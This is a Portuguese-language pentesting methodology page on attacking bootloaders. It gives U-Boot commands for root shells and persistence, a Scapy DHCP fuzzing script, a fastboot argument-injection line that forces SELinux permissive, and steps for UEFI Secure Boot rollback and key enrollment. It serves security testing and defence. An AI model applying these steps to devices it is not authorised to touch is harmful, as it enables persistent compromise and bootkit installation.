# Testes de bootloader

{{#include ../../banners/hacktricks-training.md}}

As etapas a seguir são recomendadas para modificar as configurações de inicialização do dispositivo e testar bootloaders como U-Boot e loaders da classe UEFI. Concentre-se em obter execução de código antecipada, avaliar as proteções de assinatura/rollback e abusar dos caminhos de recuperação ou inicialização pela rede.

Relacionado: bypass de secure boot da MediaTek via patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Vitórias rápidas no U-Boot e abuso do ambiente

1. Acesse o shell do interpretador
   - Durante a inicialização, pressione uma tecla de interrupção conhecida (geralmente qualquer tecla, 0, espaço ou uma sequência "mágica" específica da placa) antes de `bootcmd` ser executado para acessar o prompt do U-Boot.<sup>[[1]](#references)</sup>

2. Inspecione o estado de inicialização e as variáveis
   - Comandos úteis:
     - `printenv` (exibe o ambiente)
     - `bdinfo` (informações da placa, endereços de memória)
     - `help bootm; help booti; help bootz` (métodos de inicialização de kernel compatíveis)
     - `help ext4load; help fatload; help tftpboot` (loaders disponíveis)

3. Modifique os argumentos de inicialização para obter um shell root
   - Acrescente `init=/bin/sh` para que o kernel acesse um shell em vez de executar o init normal:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot a partir do seu servidor TFTP
   - Configure a rede e obtenha uma imagem de kernel/fit da LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Persistir alterações via ambiente
   - Se o armazenamento de env não estiver protegido contra gravação, você pode persistir o controle:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam os caminhos de fallback. Valores mal configurados podem permitir interrupções repetidas para acessar o shell.

6. Verifique recursos de debug/inseguros
   - Procure por: `bootdelay` > 0, `autoboot` desativado, `usb start; fatload usb 0:1 ...` sem restrições, capacidade de usar `loady`/`loads` via serial, `env import` de mídia não confiável e kernels/ramdisks carregados sem verificações de assinatura.

7. Testes de imagem/verificação do U-Boot
   - Se a plataforma alega usar secure/verified boot com imagens FIT, teste imagens sem assinatura e adulteradas:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - A ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou o comportamento legado de `verify=n` muitas vezes permite inicializar payloads arbitrários.
   - Não pare em um simples resultado de permitir/negar: pesquisas recentes sobre FIT mostraram que o próprio caminho de verificação pode ser uma superfície de ataque pré-autenticação. Faça testes negativos com dados FIT armazenados externamente (`data-offset`, `data-position`, `data-size`), seleção de configuração assinada, `loadables` e tratamento de overlay / `extra-conf`.
   - Se você tiver uma árvore de código-fonte correspondente, `test/vboot/vboot_test.sh` é uma maneira rápida de reproduzir o comportamento de verificação FIT no sandbox do U-Boot antes de tocar no hardware real.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` e fluxos de inicialização por script
   - Em compilações modernas do U-Boot, `bootcmd` costuma ser apenas um wrapper em torno do Standard Boot. Isso significa que mídias graváveis, PXE ou flash SPI podem se tornar o verdadeiro limite de confiança, mesmo quando o ambiente visível parece inofensivo.
   - O `bootmeth` de `extlinux` procura `extlinux/extlinux.conf` em `/` e `/boot`; o `bootmeth` de script procura primeiro `boot.scr.uimg` e depois `boot.scr`. Na inicialização pela rede, o nome do arquivo de script pode vir de `boot_script_dhcp`.
   - Comandos úteis para triagem:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Casos de abuso a testar: mídia USB/SD controlada pelo atacante em posição anterior em `boot_targets`, `/boot/extlinux/extlinux.conf` gravável, servidor TFTP malicioso fornecendo `boot.scr` ou execução de scripts com suporte SPI via `script_offset_f`.
   - Se a plataforma depender da verificação FIT, certifique-se de que as configurações sejam assinadas no nível da configuração, e não apenas por imagem; `required-mode=all` é mais rigoroso do que aceitar qualquer chave obrigatória.

## Superfície de boot pela rede (DHCP/PXE) e servidores maliciosos

9. Fuzzing de parâmetros PXE/DHCP
   - O tratamento legado de BOOTP/DHCP do U-Boot já teve problemas de segurança de memória. Por exemplo, CVE‑2024‑42040 descreve a divulgação de memória por meio de respostas DHCP criadas para vazar bytes da memória do U-Boot pela rede.<sup>[[4]](#references)</sup> Exercite os caminhos de código DHCP/PXE com valores excessivamente longos ou de casos-limite (nome do arquivo de boot da opção 67, opções do fornecedor, campos de arquivo/nome do servidor) e observe travamentos/vazamentos.
   - Trecho mínimo de Scapy para testar parâmetros de boot durante o netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Valide também se os campos de nome de arquivo PXE são passados para a lógica de shell/loader sem sanitização quando encadeados a scripts de provisionamento no lado do OS.

10. Testes de command injection em servidor DHCP rogue
   - Configure um serviço DHCP/PXE rogue e tente injetar caracteres nos campos de nome de arquivo ou opções para alcançar interpretadores de comandos em etapas posteriores da cadeia de boot. O auxiliar DHCP do Metasploit, `dnsmasq` ou scripts personalizados do Scapy funcionam bem. Isole primeiro a rede do laboratório.

## Modos de recuperação de ROM do SoC que substituem o boot normal

Muitos SoCs expõem um modo "loader" de BootROM que aceita código por USB/UART mesmo quando as imagens flash são inválidas. Se os fuses de secure-boot não estiverem gravados, isso pode permitir a execução arbitrária de código muito cedo na cadeia.

- NXP i.MX (Serial Download Mode)
  - Ferramentas: `uuu` (mfgtools3) ou `imx-usb-loader`.
  - Exemplo: `imx-usb-loader u-boot.imx` para enviar e executar um U-Boot personalizado da RAM.
- Allwinner (FEL)
  - Ferramenta: `sunxi-fel`.
  - Exemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Ferramenta: `rkdeveloptool`.
  - Exemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para carregar um loader e enviar um U-Boot personalizado.

Verifique se os eFuses/OTP de secure-boot do dispositivo estão gravados. Caso contrário, os modos de download da BootROM frequentemente contornam qualquer verificação de nível superior (U-Boot, kernel, rootfs), executando seu payload de primeiro estágio diretamente da SRAM/DRAM.

## Bootloaders UEFI/PC: verificações rápidas

11. Testes de adulteração da ESP, rollback e cadastro de chaves
   - Monte a EFI System Partition (ESP) e verifique se há componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` e caminhos de logos do fornecedor.
   - Despeje o estado do Secure Boot e os bancos de dados de chaves a partir do OS, quando possível:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Se a plataforma estiver em Setup Mode, aceitar o enrollment de chaves sem autenticação ou vier de fábrica com uma Platform Key de teste/padrão (classe PKfail), um administrador local ou invasor com acesso físico poderá cadastrar sua própria KEK/db e manter o Secure Boot aparentemente “habilitado” enquanto inicializa binários EFI arbitrários.<sup>[[3]](#references)</sup>
   - Tente inicializar com componentes de boot assinados, mas desatualizados ou sabidamente vulneráveis, se as revogações do Secure Boot (dbx) não estiverem atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, muitas vezes será possível carregar seu próprio kernel ou `grub.cfg` da ESP para obter persistência.
   - No Windows, hosts com patches ainda podem aceitar boot managers assinados e vulneráveis se o signatário `Microsoft Windows Production PCA 2011` continuar ausente da `dbx` do firmware, como observado com BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Um bypass no estilo Baton Drop pode cadastrar um MOK do invasor; em inicializações posteriores, um shim legítimo poderá carregar um payload EFI assinado com essa chave.<sup>[[12]](#references)[[13]](#references)</sup> Revogar posteriormente o antigo signatário do Windows não remove o MOK cadastrado, então o caminho baseado em shim pode persistir se esse shim continuar confiável.<sup>[[12]](#references)</sup>
   - Antes de testar esse caminho de rollback em uma máquina UEFI autorizada, verifique o **estado efetivo das revogações do firmware**, não apenas o histórico de atualizações do Windows.<sup>[[13]](#references)[[14]](#references)</sup> A Microsoft fornece esta verificação somente de leitura no PowerShell elevado para o signatário de 2011 na `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` é apenas uma pista: confirme o componente de boot assinado específico e outras revogações em um laboratório recuperável.<sup>[[12]](#references)[[14]](#references)</sup> Uma atualização pendente do registro ou um certificado de assinatura expirado não equivale a uma revogação `dbx` concluída.<sup>[[13]](#references)[[14]](#references)</sup>

12. Testes de revogação de shim / SBAT / dbx obsoletos
   - Shims antigos assinados pela Microsoft e forks de fornecedores ainda podem servir como caminho de bootkit no estilo BYOVD se as revogações estiverem desatualizadas. Em um laboratório isolado, coloque um shim historicamente vulnerável na ESP e tente fazer chainload do seu próprio `grubx64.efi` ou kernel.<sup>[[11]](#references)</sup>
   - Triagem rápida:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Se o shim ainda for executado apesar de estar na lista de revogação, o firmware/OS tem atualizações `dbx` desatualizadas ou confia em um fork do loader que nunca herdou as proteções SBAT upstream.

13. Bugs de análise de logotipo de boot (classe LogoFAIL)
   - Vários firmwares de OEM/IBV eram vulneráveis a falhas de análise de imagens no DXE que processam logotipos de boot. Se um atacante puder colocar uma imagem especialmente criada no ESP em um caminho específico do fornecedor (por exemplo, `\EFI\<vendor>\logo\*.bmp`) e reiniciar o dispositivo, poderá ser possível executar código durante o início do boot, mesmo com o Secure Boot ativado. Teste se a plataforma aceita logotipos fornecidos pelo usuário e se esses caminhos podem ser gravados pelo OS.<sup>[[2]](#references)</sup>


## Lacunas de confiança no Android/Qualcomm ABL + GBL (Android 16)

Em dispositivos Android 16 que usam o ABL da Qualcomm para carregar a **Generic Bootloader Library (GBL)**, valide se o ABL **autentica** o app UEFI que carrega da partição `efisp`. Se o ABL apenas verificar a **presença** de um app UEFI e não verificar as assinaturas, uma primitiva de escrita em `efisp` permite a **execução de código não assinado antes do OS** durante o boot.<sup>[[6]](#references)[[7]](#references)</sup>

Verificações práticas e formas de abuso:

- **efisp write primitive**: É necessário um meio de gravar um app UEFI personalizado em `efisp` (root/serviço privilegiado, bug em app do OEM, caminho de recovery/fastboot). Sem isso, a lacuna no carregamento do GBL não é diretamente explorável.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (bug no ABL): Algumas builds aceitam tokens extras em `fastboot oem set-gpu-preemption` e os acrescentam à linha de comando do kernel. Isso pode ser usado para forçar o SELinux permissivo, permitindo a gravação em partições protegidas:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Se o dispositivo estiver corrigido, o comando deve rejeitar argumentos adicionais.<sup>[[5]](#references)[[6]](#references)</sup>
- **Desbloqueio do bootloader via flags persistentes**: Um payload na etapa de boot pode alterar flags persistentes de desbloqueio (por exemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para simular `fastboot oem unlock` sem as barreiras de aprovação/servidor do OEM. Isso causa uma mudança duradoura de estado após a próxima reinicialização.<sup>[[6]](#references)</sup>

Notas de defesa/triagem:

- Confirme se o ABL realiza verificação de assinatura do payload GBL/UEFI proveniente de `efisp`. Caso contrário, trate `efisp` como uma superfície de persistência de alto risco.
- Verifique se os handlers fastboot OEM do ABL foram corrigidos para **validar a quantidade de argumentos** e rejeitar tokens adicionais.<sup>[[8]](#references)[[9]](#references)</sup>

## Cuidados com o hardware

Tenha cuidado ao interagir com a flash SPI/NAND durante o início do boot (por exemplo, aterrando pinos para contornar leituras) e consulte sempre a folha de dados da flash. Curtos no momento errado podem corromper o dispositivo ou o programador.

## Observações e dicas adicionais

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para mover blobs de ambiente entre a RAM e o armazenamento; algumas plataformas permitem importar o ambiente de mídias removíveis sem autenticação.
- Para persistência em sistemas baseados em Linux que inicializam via `extlinux.conf`, modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot costuma ser suficiente quando não há verificações de assinatura.
- Se o alvo usar atualizações com dois slots / A/B, revise as técnicas de anti-rollback e dessincronização de slots na [visão geral da análise de firmware](README.md) para não deixar passar lacunas de confiança exclusivas do atualizador e externas ao próprio bootloader.
- Se o userland fornecer `fw_printenv/fw_setenv`, valide se `/etc/fw_env.config` corresponde ao armazenamento real do ambiente. Deslocamentos mal configurados permitem ler/gravar a região MTD errada.

## References

- [1] [Metodologia de testes de segurança de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Descobrindo LogoFAIL: os perigos do processamento de imagens durante a inicialização do sistema](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: chaves de plataforma não confiáveis comprometem o Secure Boot no ecossistema UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Detalhes de CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: desbloqueando Xiaomi por meio de duas strings não sanitizadas](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit do Qualcomm Snapdragon 8 Elite GBL permite que invasores desbloqueiem bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Arquitetura do Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: corrigir a propagação de entrada não confiável para a linha de comando do kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: adicionar verificação ao comando set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: quebrando a verificação de assinatura FIT do U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Nota sobre vulnerabilidade VU#616257 - bootloaders shim UEFI assinados pela Microsoft vulneráveis a bypass do Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [Bootkit UEFI BlackLotus: mito confirmado](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: um bootkit UEFI semelhante ao BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Como gerenciar revogações do Windows Boot Manager para alterações do Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
